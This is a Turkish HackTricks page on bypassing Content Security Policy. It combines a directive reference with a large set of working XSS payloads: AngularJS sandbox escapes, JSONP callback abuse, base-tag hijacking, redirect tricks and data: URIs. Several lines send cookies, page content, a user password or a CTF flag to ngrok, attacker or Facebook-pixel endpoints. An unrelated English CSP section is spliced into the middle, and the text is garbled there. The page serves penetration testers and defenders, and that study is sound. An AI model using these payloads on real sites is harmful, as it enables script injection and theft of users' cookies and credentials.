# Content Security Policy (CSP) Bypass

## İçerik Güvenlik Politikası (CSP) Atlatma

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* takip edin.\*\*
* **Hacking hilelerinizi paylaşarak HackTricks ve HackTricks Cloud** github depolarına PR göndererek katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına inen içeriklerle etkileşime girin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasında gerçek zamanlı haberler ve içgörülerle güncel kalın

**En Son Duyurular**\
Yayınlanan en yeni ödül avı programları ve önemli platform güncellemeleri hakkında bilgi edinin

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!

### CSP Nedir

İçerik Güvenlik Politikası (CSP), başlıca olarak **çapraz site komut dosyası (XSS) gibi saldırılara karşı koruma sağlamayı amaçlayan bir tarayıcı teknolojisi** olarak kabul edilir. Tarayıcı tarafından güvenli bir şekilde yüklenebilecek kaynakların yollarını ve kaynakları tanımlayarak çalışır. Bu kaynaklar, resimler, çerçeveler ve JavaScript gibi bir dizi unsuru kapsar. Örneğin, bir politika, aynı etki alanından (self), iç kaynakları ve `eval`, `setTimeout` veya `setInterval` gibi fonksiyonlar aracılığıyla dize kodunun yüklenmesine ve yürütülmesine izin verebilir.

CSP'nin uygulanması **yanıt başlıkları** aracılığıyla veya **HTML sayfasına meta öğeleri ekleyerek** gerçekleştirilir. Bu politikaya göre, tarayıcılar bu şartları proaktif olarak uygular ve tespit edilen ihlalleri derhal engeller.

* Yanıt başlığı aracılığıyla uygulanır:

```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```

* Meta etiketi aracılığıyla uygulanmıştır:

```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

#### Başlıklar

CSP, bu başlıklar kullanılarak zorunlu kılınabilir veya izlenebilir:

* `Content-Security-Policy`: CSP'yi zorlar; tarayıcı herhangi bir ihlali engeller.
* `Content-Security-Policy-Report-Only`: İzleme için kullanılır; ihlalleri engellemeden raporlar. Üretim öncesi ortamlarda test etmek için idealdir.

#### Kaynakları Tanımlama

CSP, etkin ve pasif içerik yükleme için kökenleri kısıtlar, iç içe JavaScript yürütme ve `eval()` kullanımı gibi yönleri kontrol eder. Bir örnek politika şöyle belirlenir:

```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

#### Yönergeler

* **script-src**: JavaScript için belirli kaynaklara izin verir, URL'ler, iç içe betikler ve olay işleyicileri veya XSLT stilleri tarafından tetiklenen betikler dahil.
* **default-src**: Belirli getirme yönergeleri yokken kaynakları getirmek için varsayılan bir politika belirler.
* **child-src**: Web işçileri ve gömülü çerikler için izin verilen kaynakları belirtir.
* **connect-src**: fetch, WebSocket, XMLHttpRequest gibi arabirimler kullanılarak yüklenebilecek URL'leri kısıtlar.
* **frame-src**: Çerçeveler için URL'leri kısıtlar.
* **frame-ancestors**: Geçerli sayfayı gömebilecek kaynakları belirtir, `<frame>`, `<iframe>`, `<object>`, `<embed>` ve `<applet>` gibi öğelere uygulanır.
* **img-src**: Görüntüler için izin verilen kaynakları tanımlar.
* **font-src**: `@font-face` kullanılarak yüklenen yazı tipleri için geçerli kaynakları belirtir.
* **manifest-src**: Uygulama manifest dosyalarının izin verilen kaynaklarını tanımlar.
* **media-src**: Medya nesnelerini yüklemek için izin verilen kaynakları tanımlar.
* **object-src**: `<object>`, `<embed>` ve `<applet>` öğeleri için izin verilen kaynakları tanımlar.
* **base-uri**: `<base>` öğeleri kullanılarak yüklenmesine izin verilen URL'leri belirtir.
* **form-action**: Form gönderimleri için geçerli uç noktaları listeler.
* **plugin-types**: Bir sayfanın çağırabileceği mime türlerini kısıtlar.
* **upgrade-insecure-requests**: Tarayıcılara HTTP URL'leri HTTPS'ye yeniden yazmalarını söyler.
* **sandbox**: Bir `<iframe>`'in sandbox özniteliği gibi kısıtlamalar uygular.
* **report-to**: Politika ihlal edildiğinde raporun gönderileceği bir grup belirtir.
* **worker-src**: Worker, SharedWorker veya ServiceWorker betikleri için geçerli kaynakları belirtir.
* **prefetch-src**: Getirilecek veya önceden getirilecek kaynaklar için geçerli kaynakları belirtir.
* **navigate-to**: Bir belgenin herhangi bir şekilde (a, form, window.location, window.open, vb.) yönlendirebileceği URL'leri kısıtlar.

#### Kaynaklar

* `*`: `data:`, `blob:`, `filesystem:` şemalarına sahip olmayan tüm URL'lere izin verir.
* `'self'`: Aynı etki alanından yükleme yapılmasına izin verir.
* `'data'`: Verilerin veri şeması aracılığıyla yüklenmesine izin verir (örneğin, Base64 kodlu görüntüler).
* `'none'`: Herhangi bir kaynaktan yükleme yapmayı engeller.
* `'unsafe-eval'`: `eval()` ve benzeri yöntemlerin kullanımına izin verir, güvenlik nedeniyle önerilmez.
* `'unsafe-hashes'`: Belirli iç içe olay işleyicilerini etkinleştirir.
* `'unsafe-inline'`: İç içe `<script>` veya `<style>` gibi kaynakların kullanımına izin verir, güvenlik nedeniyle önerilmez.
* `'nonce'`: Kriptografik bir nonce (bir kez kullanılan sayı) kullanarak belirli iç içe betikler için bir beyaz liste oluşturur.
* Eğer JS sınırlı yürütme varsa, sayfa içinde kullanılan bir nonce'yi `doc.defaultView.top.document.querySelector("[nonce]")` kullanarak almak ve ardından kötü amaçlı bir betik yüklemek için yeniden kullanmak mümkündür (strict-dynamic kullanılıyorsa, herhangi bir izin verilen kaynak yeni kaynaklar yükleyebilir, bu nedenle bu gerekli değildir), örneğin:

<details>

<summary>Nonce'yi yeniden kullanarak betik yükle</summary>

\`\`\`html ![](https://github.com/carlospolop/hacktricks/blob/tr/pentesting-web/content-security-policy-csp-bypass/x) \`\`\`

</details>

* `'sha256-<hash>'`: Belirli bir sha256 karma değerine sahip betikleri beyaz listeye alır.
* `'strict-dynamic'`: Bir nonce veya karma ile beyaz listeye alınmışsa, herhangi bir kaynaktan betik yüklenmesine izin verir.
* `'host'`: `example.com` gibi belirli bir ana bilgisayar belirtir.
* `https:`: URL'leri yalnızca HTTPS kullananlara kısıtlar.
* `blob:`: Kaynakların Blob URL'lerinden (örneğin, JavaScript aracılığıyla oluşturulan Blob URL'lerinden) yüklenmesine izin verir.
* `filesystem:`: Kaynakların dosya sisteminden yüklenmesine izin verir.
* `'report-sample'`: İhlal raporunda ihlal eden kodun bir örneğini içerir (hata ayıklama için faydalıdır).
* `'strict-origin'`: 'self' ile benzerdir ancak kaynakların protokol güvenlik düzeyinin belgenin eşleştiğinden emin olur (yalnızca güvenli kökenler, güvenli kökenlerden kaynakları yükleyebilir).
* `'strict-origin-when-cross-origin'`: Aynı köken istekleri yaparken tam URL'leri gönderir, ancak istek çapraz köken olduğunda yalnızca kökeni gönderir.
* `'unsafe-allow-redirects'`: Hemen başka bir kaynağa yönlendirecek kaynakların yüklenmesine izin verir. Güvenliği zayıflatması nedeniyle önerilmez.

### Güvensiz CSP Kuralları

#### 'unsafe-inline'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```

Çalışan yük: `"/><script>alert(1);</script>`

**Iframe'lar aracılığıyla self + 'unsafe-inline'**

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

#### 'unsafe-eval'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```

Çalışan yük:

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

#### strict-dynamic

Eğer bir **izin verilen JS kodu DOM'da yeni bir script etiketi oluşturabilirse**, çünkü bir izin verilen script bunu oluşturuyorsa, **yeni script etiketi çalıştırılmasına izin verilecektir**.

#### Wildcard (\*)

```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```

Çalışan yük:

```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

#### object-src ve default-src Eksikliği

{% hint style="danger" %}
**Görünüşe göre artık bu çalışmıyor**
{% endhint %}

```yaml
Content-Security-Policy: script-src 'self' ;
```

Çalışan yükler:

```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```

#### Dosya Yükleme + 'self'

```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```

Eğer bir JS dosyası yükleyebilirseniz, bu CSP'yi atlayabilirsiniz:

Çalışan yük:

```markup
"/>'><script src="/uploads/picture.png.js"></script>
```

Ancak, sunucunun **yüklenen dosyayı doğruladığı ve yalnızca belirli türde dosyaların yüklenmesine izin verdiği** oldukça olasıdır.

Dahası, sunucu tarafından kabul edilen bir uzantı kullanarak bir dosyanın içine **JS kodu yükleseniz bile (örneğin: **_**script.png**_**)** bu yeterli olmayabilir çünkü bazı sunucular gibi apache sunucusu **dosyanın MIME türünü uzantıya göre seçer** ve Chrome gibi tarayıcılar, bir resim olması gereken bir şeyin içindeki Javascript kodunu **çalıştırmayı reddeder**. "Neyse ki", hatalar var. Örneğin, bir CTF'den öğrendiğim gibi **Apache'nin** _**.wave**_ uzantısını tanımadığını, bu nedenle bir **ses/\*** MIME türüyle sunmadığını biliyorum.

Buradan, bir XSS ve dosya yükleme bulursanız ve **yanlış yorumlanan bir uzantı** bulmayı başarırsanız, o uzantıya sahip bir dosyayı ve betiğin İçeriğini yüklemeyi deneyebilirsiniz. Veya, sunucu yüklenen dosyanın doğru biçimini kontrol ediyorsa, bir **çokdilli** oluşturabilirsiniz ([burada bazı çokdilli örnekler](https://github.com/Polydet/polyglot-database)).

#### Form-action

JS enjekte etmek mümkün değilse, örneğin kimlik bilgilerini **form eylemi enjekte ederek** sızdırmayı deneyebilirsiniz (ve belki de şifre yöneticilerinin otomatik olarak şifreleri doldurmasını bekleyebilirsiniz). Bir [**örneği bu raporda bulabilirsiniz**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Ayrıca, `default-src`'nin form eylemlerini kapsamadığını unutmayın.

#### Üçüncü Taraf Uç Noktaları + ('unsafe-eval')

{% hint style="warning" %}
Aşağıdaki bazı payloadlar için **`unsafe-eval` bile gerekli değil**.
{% endhint %}

```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```

Angular'ın zafiyetli bir sürümünü yükleyin ve keyfi JS kodunu çalıştırın:

```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```

**Angular + `window` nesnesini döndüren fonksiyonlara sahip bir kütüphane kullanarak yüklemeler (**[**bu yazıya bakın**](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)**):**

{% hint style="info" %}
Yazı, `cdn.cloudflare.com` (veya izin verilen başka JS kütüphaneleri deposu) üzerinden **tüm kütüphaneleri yükleyebileceğinizi**, her kütüphaneden eklenen tüm fonksiyonları çalıştırabileceğinizi ve **hangi fonksiyonların hangi kütüphanelerden `window` nesnesini döndürdüğünü** kontrol edebileceğinizi göstermektedir.
{% endhint %}

```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```

### Angular XSS from a class name:

#### Sınıf adından Angular XSS:

```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

**Google recaptcha JS kodunu suiistimal etmek**

[**Bu CTF çözümüne göre**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), bir CSP içinde [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) adresini suiistimal ederek CSP'yi atlayarak keyfi JS kodunu yürütebilirsiniz:

```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```

Daha fazla [**bu yazıdan payloadlar**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/) bulunabilir:

```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```

**www.google.com'un açık yönlendirmesi için kötüye kullanım**

Aşağıdaki URL, örnek.com'a yönlendirme yapar (buradan [buraya](https://www.landh.tech/blog/20240304-google-hack-50000/)):

```
https://www.google.com/amp/s/example.com/
```

#### Üçüncü Taraf Uç Noktaları + JSONP

\*.google.com/script.google.com kötüye kullanımı

Google Apps Script kötüye kullanılarak script.google.com içinde bir sayfada bilgi almak mümkündür. Bu [raporda olduğu gibi](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/) yapılmıştır.

```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```

Belirli alan adı beyaz listesine alınmış olan senaryolarda `script-src`nin `self` ve belirli bir alan adı olarak ayarlandığı durumlar JSONP kullanılarak atlatılabilir. JSONP uç noktaları güvensiz geri çağırma yöntemlerine izin verir ve saldırganın XSS gerçekleştirmesine olanak tanır, çalışan yük:

```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

[**JSONBee**](https://github.com/zigoo0/JSONBee) **farklı web sitelerinin CSP atlatmasına hazır JSONP uç noktaları içerir.**

Aynı zafiyet, **güvenilir uç nokta bir Açık Yönlendirme içeriyorsa** meydana gelecektir çünkü başlangıç uç noktası güvenilirse, yönlendirmeler güvenilir olacaktır.

#### Üçüncü Taraf Kötüye Kullanımlar

[şu yazıda](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) açıklandığı gibi, CSP'de bir yerlerde izin verilmiş olan birçok üçüncü taraf alanı, ya veri sızdırmak ya da JavaScript kodu yürütmek için kötüye kullanılabilir. Bu üçüncü taraflardan bazıları şunlardır:

| Kuruluş           | İzin Verilen Alanlar                         | Yetenekler        |
| ----------------- | -------------------------------------------- | ----------------- |
| Facebook          | www.facebook.com, \*.facebook.com            | Sızdırma          |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Sızdırma          |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Yürütme           |
| Amazon CloudFront | \*.cloudfront.net                            | Sızdırma, Yürütme |
| Amazon AWS        | \*.amazonaws.com                             | Sızdırma, Yürütme |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Sızdırma, Yürütme |
| Salesforce Heroku | \*.herokuapp.com                             | Sızdırma, Yürütme |
| Google Firebase   | \*.firebaseapp.com                           | Sızdırma, Yürütme |

Hedefinizin CSP'sinde izin verilen alanlardan herhangi birini bulursanız, büyük ihtimalle üçüncü taraf hizmetine kaydolarak CSP'yi atlayabilir ve ya veriyi o hizmete sızdırabilir ya da kodu yürütebilirsiniz.

Örneğin, aşağıdaki CSP'yi bulursanız:

```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```

## Content Security Policy (CSP) Bypass

### Introduction

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, such as Cross Site Scripting (XSS) and data injection attacks. However, misconfigurations or bypasses in CSP can lead to security vulnerabilities.

### Bypass Techniques

#### 1. Inline Script Bypass

When CSP is configured to block inline scripts (`'unsafe-inline'`), attackers can bypass this restriction by using techniques like **nonce-based bypass**, **hash-based bypass**, or **tricking the CSP**.

#### 2. External Script Bypass

If CSP is configured to only allow scripts from specific domains, attackers can bypass this restriction by **hosting malicious scripts on allowed domains**, **using subdomains**, or **exploiting misconfigured whitelists**.

#### 3. Script-src Bypass

Attackers can bypass CSP by **injecting scripts using other directives** like `connect-src`, `img-src`, or `style-src`.

### Conclusion

Understanding how CSP works and the potential bypass techniques is crucial for security professionals to effectively protect web applications from attacks. Regular security assessments and testing can help identify and mitigate CSP bypass vulnerabilities.

```
Content-Security-Policy​: connect-src www.facebook.com;​
```

1. [Burada](https://developers.facebook.com/) bir Facebook Geliştirici hesabı oluşturun.
2. Yeni bir "Facebook Giriş" uygulaması oluşturun ve "Website" seçeneğini seçin.
3. "Ayarlar -> Temel"e gidin ve "Uygulama Kimliği"nizi alın.
4. Veri sızdırmak istediğiniz hedef sitede, Facebook SDK cihazı "fbq" ve "customEvent" ile veri yükünü doğrudan kullanarak veri sızdırabilirsiniz.
5. Uygulama "Etkinlik Yöneticisi"ne gidin ve oluşturduğunuz uygulamayı seçin (etkinlik yöneticisinin URL'si şuna benzer bir yerde bulunabilir: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events)
6. "Test Etkinlikleri" sekmesini seçerek "sizin" web siteniz tarafından gönderilen etkinlikleri görebilirsiniz.

Ardından, kurban tarafında, aşağıdaki kodu yürüterek Facebook takip pikselini başlatın ve saldırganın Facebook geliştirici hesabı uygulama kimliğine işaret eden özel bir etkinlik oluşturun:

```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```

#### Önceki tabloda belirtilen diğer yedi üçüncü taraf etki alanı için, bunları kötüye kullanabileceğiniz birçok başka yol vardır. Diğer üçüncü taraf kötüye kullanımlar hakkında ek açıklamalar için önceki [blog gönderisine](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) başvurun.

#### RPO (Relative Path Overwrite) Aracılığıyla Atlatma <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Yukarıda bahsedilen yönlendirmeye ek olarak, bazı sunucularda kullanılabilen Relative Path Overwrite (RPO) adlı başka bir teknik bulunmaktadır.

Örneğin, CSP'nin `https://example.com/scripts/react/` yoluna izin verdiği durumda, aşağıdaki gibi atlatılabilir:

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

Tarayıcı sonunda `https://example.com/scripts/angular/angular.js` adresini yükleyecektir.

Bu, tarayıcı için, `https://example.com/scripts/react/` altında bulunan `..%2fangular%2fangular.js` adlı bir dosyayı yüklediğiniz anlamına gelir ve bu, CSP'ye uygundur.

Sonuç olarak, tarayıcı bunu çözecek ve etkili bir şekilde `https://example.com/scripts/react/../angular/angular.js` adresini isteyecektir, bu da `https://example.com/scripts/angular/angular.js` ile eşdeğerdir.

**Tarayıcı ve sunucu arasındaki URL yorumlama tutarsızlığını sömürerek, yol kuralları atlatılabilir**.

Çözüm, sunucu tarafında `%2f`'yi `/` olarak işlememektir, böylece tarayıcı ve sunucu arasında tutarlı yorumlama sağlanarak bu sorundan kaçınılır.

Çevrimiçi Örnek: [https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

#### İframe'lerde JS yürütme

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

#### eksik **base-uri**

Eğer **base-uri** yönergesi eksikse, bunu kötüye kullanarak [**dangling markup injection**](../dangling-markup-html-scriptless-injection/) gerçekleştirebilirsiniz.

Ayrıca, **sayfa bir Nonce kullanarak bir göreli yol** (örneğin `<script src="/js/app.js">`) kullanarak bir betik yüklüyorsa, **base** **tag**'ını kötüye kullanarak **kendi sunucunuzdan betiği yüklemesini sağlayabilir ve XSS saldırısı gerçekleştirebilirsiniz.**\
Eğer zafiyetli sayfa **httpS** ile yükleniyorsa, base'de bir httpS URL kullanın.

```html
<base href="https://www.attacker.com/">
```

#### AngularJS olayları

Belirli bir politika olan İçerik Güvenlik Politikası (CSP), JavaScript olaylarını kısıtlayabilir. Bununla birlikte, AngularJS, alternatif olarak özel olaylar tanıtır. Bir olay içinde, AngularJS, tarayıcıdaki olay nesnesine referans olan benzersiz bir `$event` nesnesi sağlar. Bu `$event` nesnesi, CSP'yi atlatmak için kullanılabilir. Özellikle, Chrome'da, `$event/event` nesnesi, olayın yürütme zincirinde yer alan bir nesne dizisini tutan `path` özniteliğine sahiptir ve bu dizide `window` nesnesi her zaman en sonda yer alır. Bu yapı, kum havuzu kaçış taktikleri için önemlidir.

Bu diziyi `orderBy` filtresine yönlendirerek, onun üzerinde yineleme yapmak ve terminal öğeyi ( `window` nesnesi) kullanarak `alert()` gibi bir genel işlevi tetiklemek mümkündür. Aşağıdaki gösterilen kod parçacığı, bu süreci açıklar:

```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

Bu parça, olayı tetiklemek için `ng-focus` yönergesinin kullanımını vurgular, `path` dizisini manipüle etmek için `$event.path|orderBy`'yi kullanır ve `alert()` işlevini yürütmek için `window` nesnesini kullanarak `document.cookie`'yi ortaya çıkarır.

**Diğer Angular bypasslarını** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **adresinde bulabilirsiniz**

#### AngularJS ve izin verilen alan adı

```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```

Bir Angular JS uygulamasında betik yükleme için alan adlarını beyaz listeye alan bir CSP politikası, geri çağrı işlevlerinin çağrılması ve belirli güvenlik açıklarına sahip sınıflar aracılığıyla atlatılabilir. Bu teknik hakkında daha fazla bilgi, bu [git deposunda](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) bulunan detaylı kılavuzda mevcuttur.

Çalışan yükler:

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```

#### Yönlendirme Aracılığıyla Atlatma

CSP yönlendirme ile karşılaştığında ne olur? Eğer yönlendirme, izin verilmeyen farklı bir kökene yol açarsa, hala başarısız olacaktır.

Ancak, [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) içindeki açıklamaya göre, eğer yönlendirme farklı bir yola yol açarsa, orijinal kısıtlamaları atlayabilir.

İşte bir örnek:

```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```

Eğer CSP `https://www.google.com/a/b/c/d` olarak ayarlanmışsa, yolun dikkate alındığından dolayı hem `/test` hem de `/a/test` betikleri CSP tarafından engellenecektir.

Ancak, son `http://localhost:5555/301` **sunucu tarafında `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`'e yönlendirilecektir**. Yönlendirme olduğundan, **yol dikkate alınmaz** ve **betik yüklenebilir**, böylece yol kısıtlaması atlatılmış olur.

Bu yönlendirme ile, yol tamamen belirtilmiş olsa bile, yine atlatılacaktır.

Bu nedenle, en iyi çözüm, web sitesinin açık yönlendirme açıklarının olmadığından ve CSP kurallarında istismar edilebilecek alan adlarının olmadığından emin olmaktır.

#### Dangling markup ile CSP'yi atlatın

[buradan nasıl yapılacağını okuyun](../dangling-markup-html-scriptless-injection/).

#### 'unsafe-inline'; img-src \*; XSS aracılığıyla

```
default-src 'self' 'unsafe-inline'; img-src *;
```

`'unsafe-inline'` demek ki kodun içinde herhangi bir scripti çalıştırabilirsiniz (XSS kodu çalıştırabilir) ve `img-src *` demek ki web sayfasında herhangi bir kaynaktan herhangi bir resmi kullanabilirsiniz.

Bu CSP'yi resimler aracılığıyla veri sızdırarak atlayabilirsiniz (bu durumda XSS, bir bot tarafından erişilebilen bir sayfada bir SQLi içeren bir CSRF'yi kötüye kullanır ve bayrağı bir resim aracılığıyla çıkarır):

```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```

From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Bu yapılandırmayı **bir resmin içine yerleştirilmiş javascript kodunu yüklemek** için de kötüye kullanabilirsiniz. Örneğin, sayfa Twitter'dan resim yükleme izni veriyorsa, **özel bir resim oluşturabilir**, bunu Twitter'a yükleyebilir ve "**unsafe-inline**"i kötüye kullanarak bir JS kodunu (normal bir XSS olarak) **çalıştırabilirsiniz**. Bu JS kodu **resmi yükleyecek**, ondan JS'yi **çıkaracak** ve **çalıştıracaktır**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

#### Servis İşçileriyle

Servis işçilerinin **`importScripts`** fonksiyonu CSP tarafından sınırlı değildir:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

#### Politika Enjeksiyonu

**Araştırma:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

**Chrome**

